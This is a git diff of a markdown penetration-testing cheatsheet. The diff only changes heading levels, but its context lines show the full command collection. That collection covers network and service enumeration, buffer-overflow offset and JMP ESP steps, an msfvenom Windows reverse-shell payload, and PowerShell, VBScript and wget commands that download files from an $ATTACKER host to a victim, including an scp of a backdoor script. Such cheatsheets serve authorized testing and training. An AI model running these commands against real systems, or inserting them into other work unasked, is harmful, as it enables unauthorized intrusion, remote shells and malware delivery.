@@ -6,12 +6,12 @@ The below is heavily inspired and based on https://github.com/dostoevskylabs/dos
 
 ## Reconnaissance / Enumeration
 
-##### Extracting Live IPs from Nmap Scan
+### Extracting Live IPs from Nmap Scan
 ```bash
 nmap 10.1.1.1 --open -oG scan-results; cat scan-results | grep "/open" | cut -d " " -f 2 > exposed-services-ips
 ```
 
-##### DNS lookups, Zone Transfers & Brute-Force
+### DNS lookups, Zone Transfers & Brute-Force
 ```bash
 whois domain.com
 dig {a|txt|ns|mx} domain.com
@@ -25,27 +25,27 @@ nslookup -> set type=any -> ls -d domain.com
 for sub in $(cat subdomains.txt);do host $sub.domain.com|grep "has.address";done
 ```
 
-##### Banner Grabbing
+### Banner Grabbing
 ```bash
 nc -v $TARGET 80
 telnet $TARGET 80
 curl -vX $TARGET
 ```
 
-##### Kerberos User Enumeration
+### Kerberos User Enumeration
 ```bash
 nmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='test'
 ```
 
 
-##### HTTP Brute-Force & Vulnerability Scanning
+### HTTP Brute-Force & Vulnerability Scanning
 ```bash
 target=10.0.0.1; gobuster -u http://$target -r -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -t 150 -l | tee /root/tools/$target/$target-gobuster
 target=10.0.0.1; nikto -h http://$target:80 | tee $target/$target-nikto
 target=10.0.0.1; wpscan --url http://$target:80 --enumerate u,t,p | tee $target/$target-wpscan-enum
 ```
 
-##### RPC / NetBios / SMB
+### RPC / NetBios / SMB
 ```bash
 rpcinfo -p $TARGET
 nbtscan $TARGET
@@ -59,7 +59,7 @@ smbclient -L //$TARGET
 enum4linux $TARGET
 ```
 
-##### SNMP
+### SNMP
 ```bash
 
 # Windows User Accounts
@@ -89,25 +89,25 @@ onesixtyone -i snmp-ips.txt -c community.txt
 snmp-check $TARGET
 ```
 
-##### SMTP
+### SMTP
 ```bash
 smtp-user-enum -U /usr/share/wordlists/names.txt -t $TARGET -m 150
 ```
 
 ## Gaining Access
 
-##### Generating Payload Pattern & Calculating Offset
+### Generating Payload Pattern & Calculating Offset
 ```bash
 /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000
 /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q $EIP_VALUE
 ```
 
-##### Generating Payload with msfvenom
+### Generating Payload with msfvenom
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.245 LPORT=443 -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai
 ```
 
-##### Cross-Compiling for Windows from Linux
+### Cross-Compiling for Windows from Linux
 ```bash
 i686-w64-mingw32-gcc source.c -lws2_32 -o out.exe
 ```
@@ -116,21 +116,21 @@ i686-w64-mingw32-gcc source.c -lws2_32 -o out.exe
 
 ## Local Enumeration & Privilege Escalation
 
-##### Binary Exploitation with ImmunityDebugger
+### Binary Exploitation with ImmunityDebugger
 
-###### Get Loaded Modules
+#### Get Loaded Modules
 ```
 # We're interested in modules without protection, Read & Execute permissions
 !mona modules
 ```
 
-###### Finding JMP ESP Address
+#### Finding JMP ESP Address
 ```
 !mona find -s "\xFF\xE4" -m moduleName
 ```
 
 
-##### Setting up Simple HTTP server
+### Setting up Simple HTTP server
 
 ```bash
 # Linux
@@ -141,9 +141,9 @@ php -S 0.0.0.0:80
 ```
 
 
-##### Uploading Files to Target Machine
+### Uploading Files to Target Machine
 
-###### TFTP
+#### TFTP
 ```bash
 #tftp; Linux: cat /etc/default/atftpd to find out file serving location; default in kali /srv/tftp
 service atftpd start
@@ -152,7 +152,7 @@ service atftpd start
 tftp -i $ATTACKER get /download/location/file /save/location/file
 ```
 
-###### FTP
+#### FTP
 ```bash
 # Linux: set up ftp server with anonymous logon access;
 twistd -n ftp -p 21 -r /file/to/serve
@@ -168,18 +168,18 @@ ftp -s:ftp-commands.txt
 ```
 
 
-###### HTTP: Poweshell
+#### HTTP: Poweshell
 ```PowerShell
 powershell.exe -Command "& {(New-Object Net.WebClient).DownloadFile('http://$ATTACKER/file.exe', 'C:\file.exe')}"
 powershell.exe -Command "& {Invoke-WebRequest 'http://$ATTACKER/file.exe' -OutFile 'C:\file.exe'}"
 ```
-###### HTTP: VBScript
+#### HTTP: VBScript
 Copy and paste contents of [wget-cscript](https://github.com/mantvydasb/Offensive-Security-Cheatsheets/blob/master/wget-cscript) into a Windows Shell and then:
 ```
 cscript wget-cscript http://$ATTACKER/file.exe localfile.exe
 ```
 
-###### HTTP: Linux
+#### HTTP: Linux
 ```bash
 wget http://$ATTACKER/file
 curl http://$ATTACKER/file
@@ -187,7 +187,7 @@ scp ~/file/file.bin user@$TARGET:tmp/backdoor.py
 ```
 
 
-##### Bash Ping Sweeper
+### Bash Ping Sweeper
 ```bash
 #!/bin/bash
 for lastOctet in {1..254}; do 
@@ -195,14 +195,14 @@ for lastOctet in {1..254}; do
 done
 ```
 
-##### Brute-forcing XOR'ed string with 1 byte key in Python
+### Brute-forcing XOR'ed string with 1 byte key in Python
 ```python
 encrypted = "encrypted-string-here"
 for i in range(0,255):
     print("".join([chr(ord(e) ^ i) for e in encrypted]))
 ```
 
-##### Generating Bad Character Strings
+### Generating Bad Character Strings
 
 ```python
 # Python
@@ -215,13 +215,13 @@ for i in {1..255}; do printf "\\\x%02x" $i; done
 ```
 
 
-##### Port Scanning with NetCat
+### Port Scanning with NetCat
 ```bash
 nc -nvv -w 1 -z host 1000-2000
 nc -nv -u -z -w 1 host 160-162
 ```
 
-##### General File Search
+### General File Search
 ```bash
 # query the local db for a quick file find. Run updatedb before executing locate.
 locate passwd 
